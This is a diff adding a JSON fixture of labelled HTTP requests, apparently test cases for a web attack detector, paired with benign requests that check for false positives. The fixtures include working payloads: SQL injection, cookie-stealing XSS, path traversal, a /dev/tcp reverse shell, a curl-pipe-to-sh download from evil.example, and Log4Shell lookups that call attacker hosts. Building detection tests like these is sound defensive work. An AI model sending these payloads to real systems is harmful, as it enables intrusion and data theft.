@@ -1,0 +1,107 @@
+[
+  {"id": "sqli-boolean-quote", "request": {"query": "id=1' OR '1'='1"}, "expect": ["sqli"]},
+  {"id": "sqli-union-select", "request": {"query": "id=1 UNION SELECT username,password FROM users--"}, "expect": ["sqli"]},
+  {"id": "sqli-union-comment-spaces", "request": {"query": "id=1+UNION/**/SELECT+1,2,3"}, "expect": ["sqli"]},
+  {"id": "sqli-time-sleep", "request": {"query": "id=1 AND SLEEP(5)"}, "expect": ["sqli"]},
+  {"id": "sqli-stacked-drop", "request": {"query": "id=1; DROP TABLE users--"}, "expect": ["sqli"]},
+  {"id": "sqli-url-encoded", "request": {"query": "id=1%27%20OR%201%3D1--"}, "expect": ["sqli"]},
+  {"id": "sqli-login-body", "request": {"body": "username=admin'--&password=x"}, "expect": ["sqli"]},
+  {"id": "sqli-boolean-blind-substring", "request": {"query": "id=1 AND ASCII(SUBSTRING(version(),1,1))>50"}, "expect": ["sqli"]},
+  {"id": "sqli-error-based-extractvalue", "request": {"query": "id=1 AND extractvalue(1,concat(0x7e,version()))"}, "expect": ["sqli"]},
+  {"id": "sqli-schema-enumeration", "request": {"query": "q=x' UNION SELECT table_name FROM information_schema.tables--"}, "expect": ["sqli"]},
+  {"id": "sqli-system-access-version", "request": {"query": "id=1 AND @@version LIKE '5%'"}, "expect": ["sqli"]},
+  {"id": "sqli-order-by-probe", "request": {"query": "sort=name' ORDER BY 7--"}, "expect": ["sqli"]},
+
+  {"id": "xss-script-tag", "request": {"query": "q=<script>alert(1)</script>"}, "expect": ["xss"]},
+  {"id": "xss-img-onerror", "request": {"query": "q=<img src=x onerror=alert(1)>"}, "expect": ["xss"]},
+  {"id": "xss-svg-onload-breakout", "request": {"query": "q=\"><svg onload=alert(1)>"}, "expect": ["xss"]},
+  {"id": "xss-javascript-uri", "request": {"query": "next=javascript:alert(document.cookie)"}, "expect": ["xss"]},
+  {"id": "xss-json-iframe", "request": {"body": "{\"comment\": \"<iframe src=//evil.example></iframe>\"}"}, "expect": ["xss"]},
+
+  {"id": "ssti-jinja-arith", "request": {"query": "name={{7*7}}"}, "expect": ["ssti"]},
+  {"id": "ssti-jinja-globals", "request": {"query": "name={{config.__class__.__init__.__globals__}}"}, "expect": ["ssti"]},
+  {"id": "ssti-el-arith", "request": {"query": "name=${7*7}"}, "expect": ["ssti"]},
+  {"id": "ssti-erb-arith", "request": {"query": "name=<%= 7*7 %>"}, "expect": ["ssti"]},
+
+  {"id": "traversal-dotdot", "request": {"query": "file=../../../../etc/passwd"}, "expect": ["traversal"]},
+  {"id": "traversal-encoded", "request": {"query": "file=..%2f..%2f..%2fetc%2fpasswd"}, "expect": ["traversal"]},
+  {"id": "traversal-double-encoded-path", "request": {"path": "/static/..%252f..%252fetc/passwd"}, "expect": ["traversal"]},
+  {"id": "traversal-php-filter", "request": {"query": "file=php://filter/convert.base64-encode/resource=index.php"}, "expect": ["traversal"]},
+  {"id": "traversal-remote-include", "request": {"query": "page=http://evil.example/shell.txt"}, "expect": ["traversal"]},
+  {"id": "traversal-windows", "request": {"query": "file=C:\\windows\\win.ini"}, "expect": ["traversal"]},
+
+  {"id": "cmdi-chain-cat", "request": {"query": "host=127.0.0.1; cat /etc/passwd"}, "expect": ["cmdi", "traversal"]},
+  {"id": "cmdi-subshell", "request": {"query": "host=$(whoami)"}, "expect": ["cmdi"]},
+  {"id": "cmdi-reverse-shell", "request": {"query": "cmd=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, "expect": ["cmdi"]},
+  {"id": "cmdi-download-pipe-sh", "request": {"query": "cmd=curl http://evil.example/x.sh | sh"}, "expect": ["cmdi"]},
+  {"id": "cmdi-absolute-path-command", "request": {"query": "host=x;/usr/bin/id"}, "expect": ["cmdi"]},
+  {"id": "cmdi-ifs-evasion", "request": {"query": "file=a;cat${IFS}notes.txt"}, "expect": ["cmdi"]},
+  {"id": "cmdi-oob-callback", "request": {"query": "host=abc123.oast.fun"}, "expect": ["cmdi"]},
+  {"id": "cmdi-shellshock-header", "request": {"headers": [["User-Agent", "() { :;}; /bin/bash -c 'id'"]]}, "expect": ["cmdi"]},
+
+  {"id": "log4shell-ua", "request": {"headers": [["User-Agent", "${jndi:ldap://evil.example/a}"]]}, "expect": ["log4shell"]},
+  {"id": "log4shell-obfuscated-header", "request": {"headers": [["X-Api-Version", "${${lower:j}ndi:ldap://evil.example/a}"]]}, "expect": ["log4shell"]},
+  {"id": "log4shell-encoded-query", "request": {"query": "x=%24%7Bjndi:ldap://evil.example/a%7D"}, "expect": ["log4shell"]},
+  {"id": "log4shell-env-probe", "request": {"query": "x=${env:AWS_SECRET_ACCESS_KEY}"}, "expect": ["log4shell"]},
+
+  {"id": "scanner-sqlmap-ua", "request": {"headers": [["User-Agent", "sqlmap/1.7.11#stable (https://sqlmap.org)"]]}, "expect": ["scanner"]},
+  {"id": "scanner-nuclei-ua", "request": {"headers": [["User-Agent", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"]]}, "expect": ["scanner"]},
+  {"id": "scanner-ffuf-ua", "request": {"headers": [["User-Agent", "Fuzz Faster U Fool v2.1.0"]]}, "expect": ["scanner"]},
+  {"id": "scanner-gobuster-ua", "request": {"headers": [["User-Agent", "gobuster/3.6"]]}, "expect": ["scanner"]},
+  {"id": "scanner-masscan-ua", "request": {"headers": [["User-Agent", "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"]]}, "expect": ["scanner"]},
+  {"id": "scanner-zgrab-ua", "request": {"headers": [["User-Agent", "Mozilla/5.0 zgrab/0.x"]]}, "expect": ["scanner"]},
+
+  {
+    "id": "mixed-sqlmap-injecting",
+    "request": {"query": "id=1' AND SLEEP(5)-- -", "headers": [["User-Agent", "sqlmap/1.7.11#stable (https://sqlmap.org)"]]},
+    "expect": ["scanner", "sqli"]
+  },
+  {
+    "id": "mixed-nuclei-log4shell",
+    "request": {
+      "path": "/",
+      "headers": [
+        ["User-Agent", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"],
+        ["X-Api-Version", "${jndi:ldap://abc.oast.fun/a}"]
+      ]
+    },
+    "expect": ["scanner", "log4shell", "cmdi"]
+  },
+
+  {"id": "clean-search", "request": {"query": "q=red running shoes"}, "expect": []},
+  {"id": "clean-pagination", "request": {"path": "/api/v1/products", "query": "page=2&limit=20&sort=price"}, "expect": []},
+  {"id": "clean-product-path", "request": {"path": "/api/v1/products/42"}, "expect": []},
+  {"id": "clean-apostrophe-name", "request": {"query": "name=O'Brien"}, "expect": []},
+  {"id": "clean-email-plus", "request": {"query": "email=user%2Bnews%40example.com"}, "expect": []},
+  {"id": "clean-less-than-text", "request": {"query": "q=1 < 2 and 3 > 2"}, "expect": []},
+  {"id": "clean-heart", "request": {"body": "comment=I <3 this product"}, "expect": []},
+  {"id": "clean-sentence-with-keywords", "request": {"query": "q=how to select a union station; cat food"}, "expect": []},
+  {"id": "clean-chmod-without-execute", "request": {"query": "q=chmod 600 ./key"}, "expect": []},
+  {"id": "clean-python-flag-text", "request": {"query": "q=python -c flag"}, "expect": []},
+  {"id": "clean-file-name", "request": {"query": "file=report-2024.pdf"}, "expect": []},
+  {"id": "clean-redirect", "request": {"query": "redirect=/account/orders"}, "expect": []},
+  {"id": "clean-url-param", "request": {"query": "url=https://example.com/page"}, "expect": []},
+  {"id": "clean-login-json", "request": {"path": "/api/v1/auth/login", "body": "{\"email\": \"a@example.com\", \"password\": \"P@ss;word&1\"}"}, "expect": []},
+  {"id": "clean-template-placeholder", "request": {"body": "{\"template\": \"Dear ${name}, your total is ${total}\"}"}, "expect": []},
+  {
+    "id": "clean-browser-request",
+    "request": {
+      "path": "/api/v1/users/7",
+      "headers": [
+        ["Host", "shop.example"],
+        ["User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"],
+        ["Accept", "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8"],
+        ["Accept-Language", "en-US,en;q=0.9"],
+        ["Referer", "https://shop.example/search?q=shoes&sort=price"],
+        ["Cookie", "session=abc123; theme=dark"],
+        ["Authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI3In0.c2ln"]
+      ]
+    },
+    "expect": []
+  },
+  {
+    "id": "clean-curl-client",
+    "request": {"path": "/api/v1/products", "headers": [["User-Agent", "curl/8.4.0"], ["Accept", "*/*"]]},
+    "expect": []
+  }
+]
